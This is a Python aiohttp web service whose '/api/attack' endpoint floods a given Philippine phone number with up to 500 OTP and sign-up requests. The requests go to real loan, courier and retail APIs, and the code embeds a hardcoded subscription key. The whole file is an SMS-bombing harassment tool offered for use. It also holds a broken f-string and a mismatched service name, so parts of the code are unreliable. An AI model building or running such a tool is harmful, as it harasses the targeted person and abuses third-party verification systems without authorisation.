import json
import aiohttp
import asyncio
import random
from aiohttp import web

SERVICES = [
    "EZLOAN","XPRESS","ABENSON","PICKUP_COFFEE",
    "HONEY_LOAN","KOMO_PH","LBC"
]

def normalize(p):
    p = p.replace(" ","").replace("-","")
    if p.startswith("0"): p = "63"+p[1:]
    if len(p)==10: p = "63"+p
    return "+63"+p[2:] if p.startswith("63") and len(p)==12 else ""

async def send(svc, session, phone):
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        if svc=="EZLOAN":
            await session.post("https://gateway.ezloancash.ph/security/auth/otp/request",
                json={"businessId":"EZLOAN","contactNumber":phone[1:]}, timeout=timeout)
        elif svc=="XPRESS":
            await session.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                json={"Phone":phone,"Email":f"t{random.randint(1,99999)}"@test.com","Password":"Test123"}, timeout=timeout)
        elif svc=="ABENSON":
            await session.post("https://api.mobile.abenson.com/api/public/membership/activate_otp",
                data={"contact_no":phone[1:]}, timeout=timeout)
        elif svc=="PICKUP_COFFEE":
            await session.post("https://production.api.pickup-coffee.net/v2/customers/login",
                json={"mobile_number":phone}, timeout=timeout)
        elif svc=="H_LOAN":
            await session.post("https://api.honeyloan.ph/api/client/registration/step-one",
                json={"phone":phone[1:]}, timeout=timeout)
        elif svc=="KOMO_PH":
            await session.post("https://api.komo.ph/api/otp/v5/generate",
                json={"mobile":phone[1:]}, headers={"Ocp-Apim-Subscription-Key":"cfde6d29634f44d3b81053ffc6298cba"}, timeout=timeout)
        elif svc=="LBC":
            await session.post("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
                data={"client_contact_no":phone[4:],"client_contact_code":"+63"}, timeout=timeout)
        return True
    except:
        return False

async def attack(target, count):
    phone = normalize(target)
    if not phone:
        return {"error":"Invalid number"}

    count = min(max(1, int(count)), 500)
    success = failed = 0

    async with aiohttp.ClientSession() as session:
        for _ in range(count):
            if await send(random.choice(SERVICES), session, phone):
                success += 1
            else:
                failed += 1
            if success + failed >= count:
                break

    return {"success":success, "failed":failed, "total":success+failed}

async def main(request):
    try:
        data = await request.json()
    except:
        data = {}

    target = data.get("target", "").strip()
    sms = int(data.get("sms", 100))

    if not target or len(target) != 11 or not target.startswith("09"):
        return web.json_response({"error":"Invalid number"}, status=400)

    result = await attack(target, sms)
    return web.json_response(result)

app = web.Application()
app.router.add_post('/api/attack', main)

handler = app
